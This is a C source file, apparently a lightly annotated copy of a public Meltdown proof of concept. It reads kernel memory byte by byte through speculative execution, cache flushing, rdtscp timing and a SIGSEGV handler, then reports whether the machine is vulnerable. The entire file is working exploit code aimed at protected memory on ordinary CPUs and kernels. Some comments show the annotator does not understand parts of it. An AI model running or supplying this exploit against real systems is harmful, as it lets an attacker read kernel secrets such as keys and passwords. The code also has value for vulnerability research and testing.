// This file is mainly based on https://github.com/paboldin/meltdown-exploit
// To be clear, the attack part of code has not changed.

#define _GNU_SOURCE

#include <math.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>

#include <x86intrin.h>

#define min(a,b)  (a<b?a:b)
#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)

#define CYCLES_FOR_EACH_MISS_HIT 1000
#define CYCLES_TO_ESTIMATE_CACHE_TIME	1000000


static char target_array[VARIANTS_READ * TARGET_SIZE];

void clflush_target(void)
{
	int i;

	for (i = 0; i < VARIANTS_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

extern char stopspeculate[];

static inline int get_access_time(volatile char *addr)
{
    /* count time of visiting the contnent of addr, which depends on whether it is cached*/
    unsigned long long begin;
    unsigned tmp;
    begin = __rdtscp(&tmp);
    (void)*addr;
    return __rdtscp(&tmp)  - begin;
}
    
static void __attribute__((noinline))
speculate(unsigned long addr)
{
    /* visit the protected addr until the val is not zero
     * then move the content to rbx
     */
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)         // input 
		: "rax", "rbx"             //  regs that may be change
	);
}


static int cache_hit_threshold;
static int hist[VARIANTS_READ];
int check(void)
{
    /* get the cache content and return the hist index*/
	int i, time, mix_i;
	volatile char *addr;

	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255;

		addr = &target_array[mix_i * TARGET_SIZE];
		time = get_access_time(addr);

		if (time <= cache_hit_threshold)
        /* check if cache hits
         * (which time is less than the cache_hit_threshold),
         * then inc the relevant hist
         **/
			hist[mix_i]++;
	}
    int ret=-1, max=-1; 
	for (i = 1; i < VARIANTS_READ; i++) {
		if (!isprint(i))
			continue;
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			ret = i;
		}
	}
    return ret; 
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    /* I dont know what this function is for */
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	return;
}

int set_signal(void)
{
    /* I dont know what this function is for */
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

int readbyte(int fd, unsigned long addr)
{
    /* read addr for many cycles and return the max */
	int i, ret = 0;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES_FOR_EACH_MISS_HIT; i++) {
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0) {
			perror("pread");
			break;
		}

		clflush_target();  // flush cache

		_mm_mfence();

		speculate(addr);  // get the content 
	}

	return check();
}


static void pin_cpu0()
{
	cpu_set_t mask;

	/* PIN to CPU0 */
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

static void
set_cache_hit_threshold(void)
{
    /* estimate the cache hit time before attacking */
	long cached, uncached, i;
    
    /* make target_array cached in cache */
	for (cached = 0, i = 0; i < CYCLES_TO_ESTIMATE_CACHE_TIME; i++)
		cached += get_access_time(target_array);

    /* sum cached content visit time */
	for (cached = 0, i = 0; i < CYCLES_TO_ESTIMATE_CACHE_TIME; i++)
		cached += get_access_time(target_array);

    /* every time using clflush to get the uncached visiting time */
	for (uncached = 0, i = 0; i < CYCLES_TO_ESTIMATE_CACHE_TIME; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= CYCLES_TO_ESTIMATE_CACHE_TIME;
	uncached /= CYCLES_TO_ESTIMATE_CACHE_TIME;


	cache_hit_threshold = sqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, cache_hit_threshold);
}



int main(int argc, char *argv[])
{
	int ret, fd, i, score, is_vulnerable;
	unsigned long addr, size;
	static char expected[] = "%s version %s";

	sscanf(argv[1], "%lx", &addr) ;  // read addr num from the first arg
	sscanf(argv[2], "%lx", &size);  // read size ( how many bytes to read)

	memset(target_array, 1, sizeof(target_array));

	ret = set_signal();
	pin_cpu0();

	set_cache_hit_threshold();

	fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	for (score = 0, i = 0; i < size; i++) {
		ret = readbyte(fd, addr);
		if (ret == -1)  // failed
			ret = 0xff;
		printf("read %lx = %x %c (score=%d/%d)\n",
		       addr, ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? hist[ret] : 0,
		       CYCLES_FOR_EACH_MISS_HIT);

		if (i < sizeof(expected) &&
		    ret == expected[i])
			score++;

		addr++;
	}

	close(fd);

	is_vulnerable = score > min(size, sizeof(expected)) / 2;

	if (is_vulnerable)
		fprintf(stderr, "VULNERABLE\n");
	else
		fprintf(stderr, "NOT VULNERABLE\n");

	exit(is_vulnerable);
}
